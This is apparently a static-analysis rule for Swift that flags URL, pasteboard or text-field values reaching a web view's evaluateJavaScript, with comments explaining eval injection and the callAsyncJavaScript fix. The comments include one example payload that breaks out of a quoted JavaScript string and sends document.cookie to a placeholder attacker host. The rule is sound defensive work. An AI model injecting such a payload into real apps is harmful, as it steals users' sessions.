# rules: swift-webview-evaluates-untrusted-script
# languages: swift
# fixture: swift/CWE-95.swift
# from: CWE-95 (Eval Injection), CWE-79, MASVS-PLATFORM-2
#
# `evaluateJavaScript` runs its argument as source text in the web view's
# context, with everything the loaded page can reach: its cookies, its local
# storage, its DOM. A value dropped into the middle of a quoted JavaScript
# string closes the quote and keeps going, so a deep link carrying
#
#     ');fetch('https://attacker/'+document.cookie);('
#
# reads the session out of a page the app trusts. On a phone the attacker is
# whoever can hand the app a URL, which is any other app and any web page.
#
# The fix is not escaping, and that is the part worth saying: quoting
# JavaScript correctly from Swift is a job nobody gets right twice.
# `callAsyncJavaScript(_:arguments:)` passes the values in a dictionary that
# never becomes source text at all. It is the same shape as binding a SQL
# parameter and it is safe for the same reason - the value is never parsed as
# code, so there is nothing to escape.
#
# `callAsyncJavaScript` is not in the sink list, which is what makes the safe
# spelling invisible to this rule by construction rather than by exclusion.
# That is the cheapest kind of exclusion there is, and it is worth noticing
# when a language hands you one.

[ "$$$V.evaluateJavaScript($JS)", "$$$V.evaluateJavaScript($JS, $$$_)",
  "$$$V.stringByEvaluatingJavaScript(from: $JS)" ] as $runs
| [ "$$$U.lastPathComponent", "$$$U.pathComponents", "$$$U.absoluteString",
    "$$$U.queryItems", "$$$U.fragment", "UIPasteboard.general.string",
    "$$$F.text", "$$$M.body" ] as $untrusted
| scan_ast("*.swift"; $runs + $untrusted) as $all
| ( $all | of($runs) | focus("JS")
    | reaching($all | of($untrusted); []) )
| finding("swift-webview-evaluates-untrusted-script";
    "this script is assembled from a value the caller of the app chose, and a "
    + "quote in it ends the string and starts code; pass it through "
    + "callAsyncJavaScript's arguments instead")
| report
